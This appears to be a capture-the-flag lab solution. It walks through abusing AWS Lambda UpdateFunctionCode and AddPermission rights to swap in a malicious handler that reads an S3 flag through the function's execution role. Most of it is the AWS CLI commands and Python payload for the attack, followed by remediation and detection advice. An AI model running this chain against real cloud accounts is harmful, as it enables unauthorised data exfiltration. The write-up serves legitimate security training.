# Solution: Lambda Code Update + Permission Grant to Bucket

This scenario demonstrates a data exfiltration path that combines two Lambda permissions: `lambda:UpdateFunctionCode` to inject a malicious payload into an existing function, and `lambda:AddPermission` to grant yourself the invocation rights needed to trigger it. The combination lets you turn a victim Lambda function into a data-retrieval proxy that runs under a privileged execution role — without ever directly touching S3 from your starting credentials.

What makes this variant particularly dangerous is the `lambda:AddPermission` requirement. In environments that implement resource-based policies on Lambda functions as a defense-in-depth measure, a plain `UpdateFunctionCode` attack would be blocked at the invocation step. Adding `lambda:AddPermission` to the attacker's permissions removes that protection entirely: the attacker simply writes themselves into the function's resource policy and proceeds.

In real environments, this attack surface appears wherever deployment automation — CI/CD pipelines, developer tooling, or infrastructure-as-code runners — is granted broad Lambda update access. The execution role holding scoped S3 access is a common pattern for Lambda functions that read configuration, process data, or deliver reports. An attacker who can update that function's code inherits the role's data access without ever assuming the role directly.

## The Challenge

You start as `pl-prod-lambda-005-to-bucket-starting-user` with credentials provided by the Terraform deployment. Your permissions are narrow: you can update code on one specific Lambda function (`pl-prod-lambda-005-to-bucket-target-lambda`), modify its resource-based policy, and invoke it. You cannot call S3 directly, cannot assume the Lambda execution role, and have no administrative path open to you.

The target is the S3 bucket `pl-prod-lambda-005-to-bucket-{account_id}-{suffix}`, which contains `flag.txt`. The Lambda function's execution role (`pl-prod-lambda-005-to-bucket-lambda-exec-role`) has `s3:GetObject` access to that bucket. Your job is to make the function retrieve the flag and hand it back to you.

There is one extra obstacle compared to a plain `UpdateFunctionCode` scenario: the function's resource-based policy does not initially allow your user to invoke it. You will need to add that permission yourself before you can pull the trigger.

## Reconnaissance

Start by confirming your identity and verifying that you have no direct S3 access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user

aws s3 ls
# An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Good — the starting user is blocked from S3. Now inspect the target Lambda to understand what you're working with:

```bash
aws lambda get-function \
  --function-name pl-prod-lambda-005-to-bucket-target-lambda \
  --query '{Handler:Configuration.Handler,Role:Configuration.Role}'
```

This gives you two critical pieces of information: the handler name (you must match it exactly when crafting your payload) and the execution role ARN (which has `s3:GetObject` on the target bucket). Check the current resource-based policy to confirm the invocation restriction:

```bash
aws lambda get-policy \
  --function-name pl-prod-lambda-005-to-bucket-target-lambda
# Either NoSuchResource or a policy that does not allow your user -- AddPermission is required either way
```

You can also use your helpful permissions to confirm there are Lambda functions worth targeting and to find the target bucket name:

```bash
aws lambda list-functions --query 'Functions[].FunctionName'

# The bucket name is an output from the Terraform deployment, but you can also
# derive it from the execution role's inline policy if you have iam:GetRolePolicy available
```

## Exploitation

### Step 1: Craft the malicious payload

Create a Python file whose name matches the Lambda handler. If the handler is `lambda_function.lambda_handler`, your file must be named `lambda_function.py`. The payload uses the execution role's identity to call `s3:GetObject` on the target bucket and returns the flag in the response body:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket = event.get('bucket')
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    flag = obj['Body'].read().decode('utf-8')
    return {
        'statusCode': 200,
        'body': flag
    }
EOF

cd /tmp && zip malicious_lambda.zip lambda_function.py
```

### Step 2: Replace the function code

```bash
aws lambda update-function-code \
  --function-name pl-prod-lambda-005-to-bucket-target-lambda \
  --zip-file fileb:///tmp/malicious_lambda.zip
```

The function now contains your malicious code. But you still cannot invoke it because the resource policy does not include your user.

### Step 3: Grant yourself invocation rights

```bash
aws lambda add-permission \
  --function-name pl-prod-lambda-005-to-bucket-target-lambda \
  --statement-id allow-self-invoke \
  --action lambda:InvokeFunction \
  --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user
```

This appends a statement to the function's resource-based policy that explicitly allows your user to invoke it. Lambda evaluates both the identity-based policy (which already permits `lambda:InvokeFunction` on this function) and the resource-based policy -- both must allow the call. The `add-permission` call satisfies the resource-policy side of that check.

You can verify the policy was added:

```bash
aws lambda get-policy \
  --function-name pl-prod-lambda-005-to-bucket-target-lambda \
  --query 'Policy' --output text | python3 -m json.tool
```

### Step 4: Invoke the function

Wait a few seconds for the code update to propagate, then invoke the function with the target bucket name in the payload:

```bash
aws lambda invoke \
  --function-name pl-prod-lambda-005-to-bucket-target-lambda \
  --payload "{\"bucket\": \"pl-prod-lambda-005-to-bucket-{account_id}-{suffix}\"}" \
  /tmp/lambda-response.json

cat /tmp/lambda-response.json
# {"statusCode": 200, "body": "flag{...}"}
```

The function executed under `pl-prod-lambda-005-to-bucket-lambda-exec-role`, which has `s3:GetObject` on the target bucket. The flag value is now in the response body.

## Verification

The flag appears directly in the Lambda invocation response. To confirm the execution role was what actually read the data — not your starting user — you can check that a direct S3 call still fails from the starting user's credentials:

```bash
aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -
# An error occurred (AccessDenied) -- your starting user still has no direct S3 access
```

This confirms the exfiltration happened indirectly through the Lambda execution role, exactly as intended.

## Capture the Flag

The flag is stored as `flag.txt` inside the target S3 bucket. You have already read it via the Lambda invocation response, but the canonical retrieval command using the access you gained through the execution role is:

```bash
aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -
```

The `aws s3 cp ... -` syntax streams the object to stdout. To run this directly you would need credentials for `pl-prod-lambda-005-to-bucket-lambda-exec-role`, which your starting user cannot assume. In practice, the Lambda invocation is the equivalent step: the function body is your code, the execution role is your identity, and the flag arrives in the invocation response. The value printed in the `body` field of the Lambda response is the flag you submit to complete the challenge.

## What Happened

You started with three Lambda permissions — `UpdateFunctionCode`, `AddPermission`, and `InvokeFunction` — and used them to turn a victim Lambda function into a data exfiltration proxy. The execution role already had the S3 access needed to read the flag; you just replaced the code that runs under that role with code that does what you want, then unlocked your own ability to trigger it.

The `lambda:AddPermission` step is what distinguishes this technique from a simpler code-update attack. An organization that uses Lambda resource policies to restrict which callers can invoke a privileged function believes that restriction offers protection even if code update permissions are broadly granted. This scenario demonstrates that belief is wrong: `AddPermission` lets an attacker rewrite the resource policy, eliminating the protection.

In a real environment the remediation is layered: enforce Lambda code signing to prevent unauthorized code changes, scope execution roles to only the exact S3 paths each function needs, and restrict `lambda:AddPermission` to CI/CD pipeline identities using SCPs or permission boundaries. Monitoring for `UpdateFunctionCode` followed shortly by `AddPermission` and `Invoke` on the same function is a high-fidelity signal for this exact attack pattern.
